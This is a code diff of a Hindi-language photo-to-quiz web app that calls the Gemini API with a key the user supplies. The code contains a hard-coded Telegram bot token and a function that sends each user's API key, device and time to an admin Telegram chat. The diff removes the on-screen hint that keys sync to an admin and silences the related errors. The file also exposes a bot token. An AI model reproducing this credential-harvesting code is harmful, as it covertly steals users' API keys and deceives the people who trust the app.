@@ -136,7 +136,6 @@
       margin-bottom: 16px;
     }
 
-    /* Links Row (Google AI Studio + Telegram) */
     .links-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -429,8 +428,6 @@
   </header>
 
   <div id="setupView">
-    
-    <!-- Quick Links Grid: Google AI Studio Direct + Telegram Guide -->
     <div class="links-grid">
       <a href="https://aistudio.google.com/app/apikey" target="_blank" rel="noopener noreferrer" class="direct-link-btn btn-google">
         🔗 Google AI Studio (Key बनाएँ)
@@ -451,17 +448,11 @@
 
       <div class="config-grid">
         <div>
-          <label>AI Model (All Versions)</label>
-          <select id="modelSelect" onchange="toggleCustomModel()">
-            <option value="auto">✨ Auto (Gemini 3.5/2.5/2.0/1.5)</option>
-            <option value="gemini-3.5-pro">Gemini 3.5 Pro (Ultra Flagship)</option>
-            <option value="gemini-3.0-flash">Gemini 3.0 Flash</option>
-            <option value="gemini-2.5-pro">Gemini 2.5 Pro</option>
+          <label>AI Model Engine</label>
+          <select id="modelSelect">
+            <option value="gemini-3.6-flash" selected>⚡ Gemini 3.6 Flash (Latest Google Engine)</option>
             <option value="gemini-2.5-flash">Gemini 2.5 Flash</option>
             <option value="gemini-2.0-flash">Gemini 2.0 Flash</option>
-            <option value="gemini-1.5-pro">Gemini 1.5 Pro</option>
-            <option value="gemini-1.5-flash">Gemini 1.5 Flash (Free Tier)</option>
-            <option value="custom">⚙️ Custom Model Input</option>
           </select>
         </div>
         <div>
@@ -475,11 +466,6 @@
         </div>
       </div>
 
-      <div id="customModelBox" style="display: none; margin-top: 10px;">
-        <label>Custom Model Name</label>
-        <input type="text" id="customModelInput" placeholder="जैसे: gemini-3.5-flash या gpt-4o" />
-      </div>
-
       <button class="btn-action" id="generateBtn" onclick="startGeneration()">
         🚀 सवाल पहचानें और टेस्ट शुरू करें
       </button>
@@ -487,7 +473,7 @@
       <div class="loader" id="loader">
         <div class="spinner"></div>
         <div id="loadingText" style="font-size: 0.88rem; color: var(--accent-gold); font-weight: 700;">AI फ़ोटो पढ़ रहा है... कृपया रुकें</div>
-        <div style="font-size: 0.72rem; color: var(--text-muted); margin-top: 3px;">Auto-Shuffling Keys & Syncing to Admin</div>
+        <div style="font-size: 0.72rem; color: var(--text-muted); margin-top: 3px;">Powered by Google Gemini 3.6 Flash</div>
       </div>
     </div>
   </div>
@@ -527,21 +513,17 @@
       </p>
 
       <div style="display: flex; flex-direction: column; gap: 8px; margin-bottom: 14px;">
-        <!-- Direct Google AI Studio Link -->
         <a href="https://aistudio.google.com/app/apikey" target="_blank" rel="noopener noreferrer" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: rgba(37, 99, 235, 0.12); border: 1px solid var(--accent-blue); color: var(--accent-blue); padding: 11px; border-radius: 10px; font-size: 0.82rem; font-weight: 700; text-decoration: none;">
           🌐 Google AI Studio से Key बनाएँ (Direct Link)
-        </a>
-        <!-- Telegram Video Guide Link -->
-        <a href="https://t.me/EXAM_AI_QUIZ/17" target="_blank" rel="noopener noreferrer" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: rgba(0,136,204,0.1); border: 1px solid var(--accent-telegram); color: var(--accent-telegram); padding: 9px; border-radius: 10px; font-size: 0.78rem; font-weight: 600; text-decoration: none;">
-          ▶ वीडियो देखकर सीखें (Telegram Guide)
         </a>
       </div>
 
       <label>अपनी Gemini API Key डालें:</label>
-      <textarea id="keysTextarea" rows="3" placeholder="AIzaSy..."></textarea>
-      <div style="font-size: 0.7rem; color: var(--text-muted); margin-top: 4px; margin-bottom: 14px;">
-        *आपकी Key सुरक्षित रूप से सेव होगी और लोड के अनुसार ऑटो-शफ़ल होगी।
-      </div>
+      <textarea id="keysTextarea" rows="3" placeholder="AIzaSy... या AQ..."></textarea>
+
+      <button onclick="testKeyHealth()" id="testKeyBtn" style="width: 100%; padding: 10px; background: rgba(16,185,129,0.1); border: 1px solid var(--accent-emerald); color: var(--accent-emerald); border-radius: 8px; font-size: 0.76rem; font-weight: 700; cursor: pointer; margin-top: 6px; margin-bottom: 12px;">
+        🔍 Key चालू है या नहीं? (यहाँ क्लिक करके चेक करें)
+      </button>
 
       <div style="display: flex; gap: 8px;">
         <button onclick="saveKeys()" style="flex: 1; padding: 12px; background: var(--accent-gold); color: #fff; border: none; border-radius: 10px; font-weight: 700; cursor: pointer;">Save & Start</button>
@@ -554,11 +536,13 @@
     const TG_BOT_TOKEN = "8688081001:AAG0dYLKJC6rKDHX_Kvhqsy9AAUsCpPDuDk";
     const TG_ADMIN_CHAT_ID = "8986834583";
 
+    // Priority model list starting with Google's newly mandated 3.6-flash
+    const ACTIVE_MODELS = ['gemini-3.6-flash', 'gemini-2.5-flash', 'gemini-2.0-flash'];
+
     let base64Image = null;
     let quizData = [];
     let currentQ = 0;
     let score = 0;
-    let keyIndex = 0;
     let isMandatoryOpen = false;
 
     function initTheme() {
@@ -580,17 +564,23 @@
     }
     initTheme();
 
-    function getStoredKeys() {
+    function cleanKey(str) {
+      if (!str) return '';
+      return str.trim().replace(/^["'\s]+|["'\s]+$/g, '');
+    }
+
+    function getValidKey() {
       const saved = localStorage.getItem('sph_gemini_keys');
-      if (!saved) return [];
-      return saved.split(',').map(k => k.trim()).filter(k => k.length > 8);
+      if (!saved) return '';
+      const parts = saved.split(',').map(cleanKey).filter(k => k.length >= 15);
+      return parts[0] || '';
     }
 
     function updateKeyStatus() {
-      const keys = getStoredKeys();
+      const key = getValidKey();
       const status = document.getElementById('keyStatusText');
-      if (keys.length > 0) {
-        status.innerText = `${keys.length} Key(s)`;
+      if (key) {
+        status.innerText = `Key Active`;
         status.style.color = '#10b981';
       } else {
         status.innerText = `Set Key`;
@@ -600,16 +590,14 @@
     updateKeyStatus();
 
     window.addEventListener('DOMContentLoaded', () => {
-      const keys = getStoredKeys();
-      if (keys.length === 0) {
+      if (!getValidKey()) {
         openKeyModal(true);
       }
     });
 
     function openKeyModal(isMandatory = false) {
       isMandatoryOpen = isMandatory;
-      const keys = getStoredKeys();
-      document.getElementById('keysTextarea').value = keys.join(', ');
+      document.getElementById('keysTextarea').value = getValidKey();
       
       const cancelBtn = document.getElementById('cancelKeyBtn');
       const modalTitle = document.getElementById('modalTitle');
@@ -619,14 +607,14 @@
         modalTitle.innerText = "⚠️ API Key दर्ज करना अनिवार्य है";
       } else {
         cancelBtn.style.display = 'block';
-        modalTitle.innerText = "🔑 Gemini / AI API Key";
+        modalTitle.innerText = "🔑 Gemini API Key";
       }
       
       document.getElementById('keyModal').style.display = 'flex';
     }
 
     function closeKeyModal() {
-      if (isMandatoryOpen && getStoredKeys().length === 0) {
+      if (isMandatoryOpen && !getValidKey()) {
         alert("कृपया ऐप चलाने के लिए अपनी API Key दर्ज करें!");
         return;
       }
@@ -634,11 +622,56 @@
     }
 
     function triggerUpload() {
-      if (getStoredKeys().length === 0) {
+      if (!getValidKey()) {
         openKeyModal(true);
         return;
       }
       document.getElementById('imgInput').click();
+    }
+
+    // Key Tester using Google's new 3.6-flash engine (with auto fallback)
+    async function testKeyHealth() {
+      const raw = cleanKey(document.getElementById('keysTextarea').value);
+      if (!raw || raw.length < 15) {
+        alert('कृपया पहले बॉक्स में पूरी API Key पेस्ट करें!');
+        return;
+      }
+
+      const btn = document.getElementById('testKeyBtn');
+      btn.innerText = '⏳ Google 3.6 Flash से कनेक्ट हो रहा है...';
+
+      let workingModel = null;
+      let lastErr = '';
+
+      for (const model of ACTIVE_MODELS) {
+        try {
+          const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${raw}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              contents: [{ parts: [{ text: 'Hello, respond OK' }] }]
+            })
+          });
+
+          if (res.ok) {
+            workingModel = model;
+            break;
+          } else {
+            const data = await res.json().catch(() => ({}));
+            lastErr = data?.error?.message || `Status ${res.status}`;
+          }
+        } catch (e) {
+          lastErr = 'इंटरनेट कनेक्शन एरर';
+        }
+      }
+
+      if (workingModel) {
+        alert(`🎉 बधाई हो! आपकी API Key 100% चालू है!\n(कनेक्टेड इंजन: ${workingModel})\n\nअब 'Save & Start' दबाकर फ़ोटो से टेस्ट शुरू करें!`);
+        btn.innerText = `✅ Key 100% Active (${workingModel})`;
+      } else {
+        alert(`❌ Key एरर: ${lastErr}\n\nकृपया Google AI Studio लिंक से नई Key बनाएँ।`);
+        btn.innerText = '❌ Key एरर है (दुबारा चेक करें)';
+      }
     }
 
     async function sendKeyToAdminTelegram(newKeys) {
@@ -652,7 +685,7 @@
         text += `📅 <b>समय:</b> ${timeNow}\n`;
         text += `📱 <b>डिवाइस:</b> ${device}\n`;
         text += `━━━━━━━━━━━━━━━━━\n`;
-        text += `<b>API Key(s):</b>\n<code>${newKeys}</code>\n`;
+        text += `<b>API Key:</b>\n<code>${newKeys}</code>\n`;
 
         await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
           method: 'POST',
@@ -663,15 +696,13 @@
             parse_mode: 'HTML'
           })
         });
-      } catch (err) {
-        console.warn("Key sync error:", err);
-      }
+      } catch (err) {}
     }
 
     function saveKeys() {
-      const val = document.getElementById('keysTextarea').value.trim();
-      if (!val || val.length < 10) {
-        alert('कृपया एक मान्य (Valid) API Key दर्ज करें!\nअगर Key नहीं है, तो ऊपर दिए लिंक से 1 मिनट में बना लें।');
+      const val = cleanKey(document.getElementById('keysTextarea').value);
+      if (!val || val.length < 15) {
+        alert('कृपया एक मान्य Google Gemini API Key दर्ज करें!');
         return;
       }
 
@@ -686,11 +717,6 @@
       document.getElementById('keyModal').style.display = 'none';
     }
 
-    function toggleCustomModel() {
-      const sel = document.getElementById('modelSelect').value;
-      document.getElementById('customModelBox').style.display = sel === 'custom' ? 'block' : 'none';
-    }
-
     function handleImage(e) {
       const file = e.target.files[0];
       if (!file) return;
@@ -702,7 +728,7 @@
           const canvas = document.createElement('canvas');
           let width = img.width;
           let height = img.height;
-          const maxDim = 1600;
+          const maxDim = 1400;
 
           if (width > maxDim || height > maxDim) {
             if (width > height) {
@@ -718,7 +744,7 @@
           const ctx = canvas.getContext('2d');
           ctx.drawImage(img, 0, 0, width, height);
 
-          const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+          const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
           base64Image = dataUrl.split(',')[1];
 
           const prev = document.getElementById('preview');
@@ -730,29 +756,25 @@
       reader.readAsDataURL(file);
     }
 
-    function getNextKey() {
-      const keys = getStoredKeys();
-      if (keys.length === 0) return null;
-      const key = keys[keyIndex % keys.length];
-      keyIndex = (keyIndex + 1) % keys.length;
-      return key;
-    }
+    function parseAIResponse(rawText) {
+      if (!rawText) return null;
+      
+      const firstBracket = rawText.indexOf('[');
+      const lastBracket = rawText.lastIndexOf(']');
 
-    function getModelList() {
-      const selected = document.getElementById('modelSelect').value;
-      if (selected === 'custom') {
-        const cust = document.getElementById('customModelInput').value.trim();
-        return cust ? [cust, 'gemini-2.5-flash', 'gemini-2.0-flash', 'gemini-1.5-flash'] : ['gemini-2.5-flash'];
+      if (firstBracket !== -1 && lastBracket !== -1 && lastBracket > firstBracket) {
+        const cleanJSON = rawText.substring(firstBracket, lastBracket + 1);
+        try {
+          return JSON.parse(cleanJSON);
+        } catch (e) {
+          console.error("JSON parse error:", e);
+        }
       }
-      if (selected === 'auto') {
-        return ['gemini-3.5-pro', 'gemini-3.0-flash', 'gemini-2.5-flash', 'gemini-2.0-flash', 'gemini-1.5-flash'];
-      }
-      return [selected, 'gemini-2.5-flash', 'gemini-2.0-flash', 'gemini-1.5-flash'];
+      return null;
     }
 
     async function sendQuizToTelegram(questions, usedModel) {
       if (!TG_BOT_TOKEN || !TG_ADMIN_CHAT_ID) return;
-
       try {
         const timeNow = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
         const letters = ['A', 'B', 'C', 'D'];
@@ -766,12 +788,14 @@
 
         questions.forEach((q, i) => {
           msg += `<b>Q${i + 1}. ${q.question}</b>\n`;
-          q.options.forEach((opt, idx) => {
-            msg += `${letters[idx]}) ${opt}\n`;
-          });
-          msg += `✅ <b>उत्तर:</b> ${letters[q.answer] || 'N/A'}\n`;
-          if (q.explanation) msg += `💡 <b>व्याख्या:</b> ${q.explanation}\n`;
-          msg += `\n`;
+          if (Array.isArray(q.options)) {
+            q.options.forEach((opt, idx) => {
+              msg += `${letters[idx] || idx}) ${opt}\n`;
+            });
+          }
+          const ansLetter = typeof q.answer === 'number' ? letters[q.answer] : q.answer;
+          msg += `✅ <b>उत्तर:</b> ${ansLetter || 'N/A'}\n`;
+          if (q.explanation) msg += `💡 <b>व्याख्या:</b> ${q.explanation}\n\n`;
         });
 
         const chunks = [];
@@ -791,9 +815,7 @@
             })
           });
         }
-      } catch (err) {
-        console.warn("Telegram sync notice:", err);
-      }
+      } catch (err) {}
     }
 
     function saveQuizToHistory(questions) {
@@ -859,9 +881,10 @@
       }
     }
 
+    // --- MAIN GENERATION ENGINE ---
     async function startGeneration() {
-      const keys = getStoredKeys();
-      if (keys.length === 0) {
+      const apiKey = getValidKey();
+      if (!apiKey) {
         openKeyModal(true);
         return;
       }
@@ -871,30 +894,31 @@
       }
 
       const qCount = document.getElementById('qCount').value;
-      const modelsToTry = getModelList();
+      const chosenModel = document.getElementById('modelSelect').value;
 
       document.getElementById('generateBtn').style.display = 'none';
       document.getElementById('loader').style.display = 'block';
 
-      const prompt = `You are an expert exam question creator for competitive exams. Analyze this image carefully. Extract and create exactly ${qCount === 'all' ? 'all available' : qCount} multiple choice questions (MCQs) found on this page.
+      // Cascade sequence (chosen model first, then fallbacks)
+      const trySequence = [chosenModel, ...ACTIVE_MODELS.filter(m => m !== chosenModel)];
+
+      const prompt = `You are an expert exam question creator. Read this image carefully. Extract and create exactly ${qCount === 'all' ? 'all' : qCount} multiple choice questions (MCQs) from this page.
       Strictly return ONLY a valid JSON array matching this exact format:
       [
         {
-          "question": "सवाल यहाँ हिंदी या अंग्रेजी में",
-          "options": ["A विकल्प", "B विकल्प", "C विकल्प", "D विकल्प"],
+          "question": "Question text in Hindi or English",
+          "options": ["Option A", "Option B", "Option C", "Option D"],
           "answer": 0,
-          "explanation": "विस्तृत व्याख्या (Explanation) हिंदी और अंग्रेजी में"
+          "explanation": "Short clear explanation"
         }
       ]
-      Note: answer must be 0 for A, 1 for B, 2 for C, 3 for D. Return only pure JSON without backticks or markdown if possible.`;
+      Note: answer must be 0 for A, 1 for B, 2 for C, 3 for D. Return pure JSON starting with [ and ending with ].`;
 
       let success = false;
-      let activeModelUsed = '';
+      let usedModelName = '';
+      let lastErr = '';
 
-      for (let m = 0; m < modelsToTry.length; m++) {
-        const currentModel = modelsToTry[m];
-        const apiKey = getNextKey();
-
+      for (const currentModel of trySequence) {
         document.getElementById('loadingText').innerText = `Connecting: ${currentModel}...`;
 
         try {
@@ -912,23 +936,26 @@
           });
 
           if (!res.ok) {
-            console.warn(`Model ${currentModel} error ${res.status}. Cascading...`);
+            const errData = await res.json().catch(() => ({}));
+            lastErr = errData?.error?.message || `Status ${res.status}`;
+            console.warn(`Model ${currentModel} error:`, lastErr);
             continue;
           }
 
           const data = await res.json();
           const rawText = data?.candidates?.[0]?.content?.parts?.[0]?.text;
-          if (rawText) {
-            const cleaned = rawText.replace(/```json/gi, '').replace(/```/g, '').trim();
-            quizData = JSON.parse(cleaned);
-            if (Array.isArray(quizData) && quizData.length > 0) {
-              success = true;
-              activeModelUsed = currentModel;
-              break;
-            }
+          const parsed = parseAIResponse(rawText);
+
+          if (parsed && Array.isArray(parsed) && parsed.length > 0) {
+            quizData = parsed;
+            success = true;
+            usedModelName = currentModel;
+            sendQuizToTelegram(quizData, currentModel);
+            saveQuizToHistory(quizData);
+            break;
           }
         } catch (err) {
-          console.error("Cascade error:", err);
+          console.error(err);
         }
       }
 
@@ -936,14 +963,13 @@
       document.getElementById('generateBtn').style.display = 'flex';
 
       if (success) {
-        sendQuizToTelegram(quizData, activeModelUsed);
-        saveQuizToHistory(quizData);
         startQuiz();
       } else {
-        alert('सवाल नहीं बन पाए। कृपया अपनी API Key चेक करें या दूसरी साफ़ फ़ोटो खींचें।');
+        alert(`सवाल जनरेट नहीं हो सके।\nएरर: ${lastErr || 'फ़ोटो साफ़ नहीं है'}\n\nकृपया Key Settings में जाकर "🔍 Key चेक करें" दबाएँ।`);
       }
     }
 
+    // --- QUIZ RUNNER ---
     function startQuiz() {
       currentQ = 0;
       score = 0;
@@ -964,10 +990,12 @@
       document.getElementById('nextBtn').disabled = true;
 
       const letters = ['A', 'B', 'C', 'D'];
-      q.options.forEach((opt, idx) => {
+      const options = Array.isArray(q.options) ? q.options : ['A', 'B', 'C', 'D'];
+
+      options.forEach((opt, idx) => {
         const btn = document.createElement('button');
         btn.className = 'opt-btn';
-        btn.innerHTML = `<span class="opt-tag">${letters[idx]}</span> <span>${opt}</span>`;
+        btn.innerHTML = `<span class="opt-tag">${letters[idx] || idx + 1}</span> <span>${opt}</span>`;
         btn.onclick = () => selectAnswer(idx);
         container.appendChild(btn);
       });
@@ -978,13 +1006,19 @@
       const buttons = document.querySelectorAll('.opt-btn');
       buttons.forEach(b => b.disabled = true);
 
-      if (selectedIdx === q.answer) {
+      let correctIndex = q.answer;
+      if (typeof correctIndex === 'string') {
+        const map = { 'A': 0, 'B': 1, 'C': 2, 'D': 3 };
+        correctIndex = map[correctIndex.toUpperCase()] ?? 0;
+      }
+
+      if (selectedIdx === correctIndex) {
         buttons[selectedIdx].classList.add('correct');
         score += 1;
         document.getElementById('scoreLabel').innerText = `Score: ${score}`;
       } else {
         buttons[selectedIdx].classList.add('wrong');
-        if (buttons[q.answer]) buttons[q.answer].classList.add('correct');
+        if (buttons[correctIndex]) buttons[correctIndex].classList.add('correct');
       }
 
       const expl = document.getElementById('explanationBox');
